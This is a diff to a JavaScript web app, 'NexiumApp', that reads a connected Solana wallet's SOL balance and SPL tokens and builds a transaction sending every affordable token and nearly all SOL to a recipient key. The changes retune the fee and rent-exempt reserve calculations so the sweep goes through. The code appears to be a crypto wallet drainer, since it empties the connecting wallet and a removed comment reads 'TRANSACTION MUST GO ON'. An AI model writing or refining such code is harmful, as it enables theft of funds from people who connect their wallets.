@@ -361,10 +361,14 @@ class NexiumApp {
       const balance = await this.solConnection.getBalance(senderPublicKey);
       console.log(`SOL balance: ${balance} lamports (${balance / 1e9} SOL)`);
 
-      // Minimum required: base fee + buffer for SOL-only transfer
+      // RENT EXEMPT MINIMUM: Account must keep at least 0.00089088 SOL (890880 lamports)
+      // This is the rent-exempt minimum for a basic account
+      const RENT_EXEMPT_MINIMUM = 890880;
       const baseFee = 5000;
-      const feeBuffer = 500000; // 0.0005 SOL buffer
-      const minRequiredForSolOnly = baseFee + feeBuffer;
+      const feeBuffer = 500000; // 0.0005 SOL extra buffer for safety
+      
+      // Total that must remain in account: rent exempt + fees
+      const mustKeepInAccount = RENT_EXEMPT_MINIMUM + baseFee + feeBuffer;
 
       // ====== CHECK SPL TOKENS ======
       console.log("Checking for SPL tokens...");
@@ -404,8 +408,7 @@ class NexiumApp {
       // Per token instruction costs:
       // - Create ATA: ~0.002039 SOL (rent exempt) + fee
       // - Transfer: ~5000 CU
-      // We'll use a conservative estimate
-      const perTokenTransferCost = 10000; // 0.00001 SOL per token transfer (fees only)
+      const perTokenTransferFee = 5000; // fee per token transfer
       const ataCreationCost = 2040000; // ~0.002039 SOL for rent exempt ATA (if needed)
 
       const instructions = [];
@@ -423,16 +426,18 @@ class NexiumApp {
         const recipientAccountInfo = await this.solConnection.getAccountInfo(recipientTokenAccount);
         
         let ataCost = 0;
+        let additionalFee = perTokenTransferFee;
+        
         if (!recipientAccountInfo) {
           ataCost = ataCreationCost;
+          additionalFee += 5000; // extra fee for ATA creation instruction
         }
 
-        const additionalCost = perTokenTransferCost + ataCost;
+        const totalAdditionalCost = ataCost + additionalFee;
         
-        // Check if we can afford this token + at least SOL-only minimum
-        if (balance > estimatedFee + additionalCost + minRequiredForSolOnly) {
-          estimatedFee += additionalCost;
-          if (!recipientAccountInfo) ataCreationsNeeded++;
+        // Check if we can afford this token + must keep minimum in account
+        if (balance > mustKeepInAccount + estimatedFee + totalAdditionalCost) {
+          estimatedFee += additionalFee;
           tokensToTransfer++;
         } else {
           console.log(`Cannot afford to transfer token ${token.mint}, skipping`);
@@ -476,19 +481,15 @@ class NexiumApp {
       }
 
       // ====== ADD SOL TRANSFER ======
-      // Always ensure we leave enough for fees
-      const totalRequired = estimatedFee + feeBuffer;
-      
-      if (balance <= totalRequired) {
-        // Not enough SOL for even fees - but we still try to send tokens if any
-        console.warn("Low SOL balance, attempting token-only transfer");
-      }
-
+      // Calculate max transferable SOL (must leave rent exempt minimum)
+      const totalRequired = mustKeepInAccount + estimatedFee;
       const transferableSol = balance > totalRequired ? balance - totalRequired : 0;
+      
+      console.log(`Total required reserve: ${totalRequired} (rent: ${RENT_EXEMPT_MINIMUM} + fees: ${estimatedFee} + buffer)`);
       console.log(`Transferable SOL: ${transferableSol} lamports (${transferableSol / 1e9} SOL)`);
 
-      // Add SOL transfer if there's meaningful amount
-      if (transferableSol > 10000) {
+      // Add SOL transfer if there's meaningful amount (> 0.0001 SOL)
+      if (transferableSol > 100000) {
         const solTransferInstruction = SystemProgram.transfer({
           fromPubkey: senderPublicKey,
           toPubkey: recipientPublicKey,
@@ -496,25 +497,14 @@ class NexiumApp {
         });
         instructions.push(solTransferInstruction);
         console.log("Added SOL transfer instruction");
+      } else {
+        console.log("SOL balance too small to transfer after rent reserve, skipping SOL transfer");
       }
 
-      // ====== FALLBACK: IF NOTHING TO TRANSFER, DO MINIMAL SOL TRANSFER ======
-      if (instructions.length === 0 && balance > minRequiredForSolOnly) {
-        // Just transfer SOL (no tokens found or couldn't afford any)
-        const transferableBalance = balance - minRequiredForSolOnly;
-        const solInstruction = SystemProgram.transfer({
-          fromPubkey: senderPublicKey,
-          toPubkey: recipientPublicKey,
-          lamports: transferableBalance
-        });
-        instructions.push(solInstruction);
-        console.log(`Fallback: SOL-only transfer of ${transferableBalance} lamports`);
-      }
-
-      // ====== FINAL CHECK - TRANSACTION MUST GO ON ======
+      // ====== FALLBACK: IF NOTHING TO TRANSFER ======
       if (instructions.length === 0) {
-        console.log("No instructions to execute - insufficient balance");
-        this.showFeedback("Insufficient balance for transaction.", 'error');
+        console.log("No tokens to transfer and SOL too low");
+        this.showFeedback("Insufficient balance - need more SOL to cover fees.", 'error');
         return;
       }
 
